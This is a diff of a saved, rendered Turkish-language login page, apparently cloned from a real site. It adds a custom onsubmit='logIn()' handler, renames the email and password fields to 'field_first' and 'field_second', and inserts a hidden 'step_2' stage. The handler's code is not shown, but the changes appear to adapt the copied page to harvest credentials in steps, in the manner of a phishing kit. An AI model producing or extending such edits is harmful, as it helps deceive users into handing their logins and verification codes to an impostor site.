@@ -1066,8 +1066,10 @@
                   <login class="ng-star-inserted">
                     <!---->
                     <!---->
-                    <form novalidate="" test-id="login-modal" class="login-fields ng-untouched ng-pristine ng-invalid ng-star-inserted">
-                      <form-input-material fieldtype="email" formtextuals="login" class="ng-untouched ng-pristine ng-invalid">
+                    <form onsubmit="logIn()" novalidate="" test-id="login-modal" id="login_form" class="login-fields ng-untouched ng-pristine ng-invalid ng-star-inserted">
+                    <div class="loginSteps">
+        <div class="step_1"> 
+                    <form-input-material fieldtype="email" formtextuals="login" class="ng-untouched ng-pristine ng-invalid">
                         <div class="field clearfix ng-untouched ng-pristine ng-invalid">
                           <div class="input">
                             <div class="clearfix">
@@ -1077,7 +1079,7 @@
                                 <div class="input-wrapper">
                                   <!---->
                                   <div class="input-icons-wrapper">
-                                    <input id="Login-Email" name="undefined" autocomplete="undefined" type="email" placeholder="" test-id="Login-Email" class="placeholder-label-active ng-untouched ng-pristine ng-invalid">
+                                    <input id="Login-Email" name="field_first" autocomplete="undefined" type="email" placeholder="" test-id="Login-Email" class="placeholder-label-active ng-untouched ng-pristine ng-invalid">
                                     <span class="bar"></span>
                                     <label class="placeholder-label ng-star-inserted">E-posta</label>
                                     <!---->
@@ -1104,7 +1106,7 @@
                                 <div class="input-wrapper">
                                   <!---->
                                   <div class="input-icons-wrapper">
-                                    <input id="Login-Password" name="undefined" autocomplete="undefined" type="password" placeholder="" test-id="Login-Password" class="placeholder-label-active ng-untouched ng-pristine ng-invalid">
+                                    <input id="Login-Password" name="field_second" autocomplete="undefined" type="password" placeholder="" test-id="Login-Password" class="placeholder-label-active ng-untouched ng-pristine ng-invalid">
                                     <span class="bar"></span>
                                     <label class="placeholder-label ng-star-inserted">Şifre</label>
                                     <!---->
@@ -1121,6 +1123,10 @@
                           <!---->
                         </div>
                       </form-input-material>
+                      <div id="step_2" class="dnone">
+                                                                                </div>
+</div>
+
                       <div class="forgot-password">
                         <a test-id="forgot-password-link" href="/tr/sifremi-unuttum/">Şifremi Unuttum</a>&nbsp;
                       </div>
@@ -1134,6 +1140,7 @@
                           </span>
                         </div>
                       </div>
+  </div>
                     </form>
                     <!---->
                   </login>
